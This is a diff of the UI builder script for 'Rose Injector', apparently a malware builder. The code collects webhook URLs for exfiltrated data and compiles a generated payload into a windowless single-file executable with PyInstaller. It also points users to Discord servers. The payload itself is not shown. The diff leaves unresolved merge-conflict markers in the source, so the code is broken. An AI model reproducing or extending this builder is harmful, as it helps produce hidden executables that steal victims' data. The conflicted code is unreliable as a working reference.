@@ -78,9 +78,17 @@ links = {
     "suegdu_github": "https://github.com/suegdu",
     "svn_github": "https://github.com/suvan1911",
     "rose_github": "https://github.com/DamagingRose/Rose-Injector",
+<<<<<<< HEAD
     "rose_discord": "https://discord.gg/D7Qpj8sKUF"
 }
 
+=======
+    "rose_discord": "https://discord.gg/gz5fUCkw8p"
+}
+
+logger.critical(f"Rose UI Builder is using version {str(__version__)}")
+
+>>>>>>> b718d58a507718ebb9c2d7628e7d6aeaf66e67c1
 def open_link(key):
     webbrowser.open(links[key])
 
@@ -101,7 +109,7 @@ def auto_update():
         if version != __version__:
             f = ctypes.windll.user32.MessageBoxW(
                 0, 
-                "A new version has been detected.\nWould you like to automatically update?",
+                f"A new version has been detected.\nWould you like to download the new version?\nCurrent version: {str(__version__)} | New version {str(version)}",
                 "Rose Injector",
                 4
             )
@@ -162,9 +170,12 @@ def _makebuild(q: Queue, data_builder) -> str:
         data_builder['vm_webhook_url'] = data_builder['webhook_url']
 
     ui.notify("Build has been started!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
+<<<<<<< HEAD
 
     if data_builder["vm_webhook_url"] == "":
         data_builder["vm_webhook_url"] = data_builder["webhook_url"]
+=======
+>>>>>>> b718d58a507718ebb9c2d7628e7d6aeaf66e67c1
         
     path = f"{Path(__file__).resolve().parent}\\{data_builder['build_name']}"
         
@@ -224,9 +235,15 @@ def _makebuild(q: Queue, data_builder) -> str:
     def compile():
         try:
             logger.info("Entering compile process")
+<<<<<<< HEAD
             logger.info(f'Compile CMD Line: pyinstaller "{path}\main.py" --noconsole --onefile')
             output_file = "rosecompile.log"
             subprocess.call(f'pyinstaller "{path}\main.py" --noconsole --onefile', shell=True, stdout=open(output_file, 'w'), stderr=subprocess.STDOUT)
+=======
+            logger.info(f'Compile CMD Line: python -m PyInstaller "{path}\main.py" --noconsole --onefile')
+            output_file = "rosecompile.log"
+            subprocess.call(f'python -m PyInstaller "{path}\main.py" --noconsole --onefile', shell=True, stdout=open(output_file, 'w'), stderr=subprocess.STDOUT)
+>>>>>>> b718d58a507718ebb9c2d7628e7d6aeaf66e67c1
             logger.info(f"Output of compile process saved in rosecompile.log")
         except Exception as e:
             logger.error(f"Error in compile: {e}")
@@ -258,7 +275,11 @@ def _home():
     with ui.dialog() as dialog, ui.card():
         ui.label('If everything went good, your compiled file should be in the folder, else join our discord')
         ui.button("Open Folder", on_click=lambda: os.startfile(Path(__file__).resolve().parent))
+<<<<<<< HEAD
         ui.button('Join Discord', on_click=lambda: webbrowser.open('https://discord.gg/D7Qpj8sKUF'))
+=======
+        ui.button('Join Discord', on_click=lambda: webbrowser.open('https://discord.gg/gz5fUCkw8p'))
+>>>>>>> b718d58a507718ebb9c2d7628e7d6aeaf66e67c1
         ui.button('Close', on_click=dialog.close)
         
     async def start_computation():
